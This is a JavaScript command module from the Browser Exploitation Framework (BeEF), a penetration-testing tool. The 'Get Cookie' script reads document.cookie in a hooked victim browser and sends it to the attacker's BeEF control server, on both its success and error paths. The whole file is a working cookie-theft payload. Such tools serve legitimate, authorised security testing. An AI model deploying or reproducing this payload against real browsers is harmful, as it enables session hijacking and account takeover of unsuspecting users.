//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

try {
      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_success());
      beef.debug("[Get Cookie] Cookie captured: "+document.cookie);
}catch(e){
      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_error());
      beef.debug("[Get Cookie] Error");
}


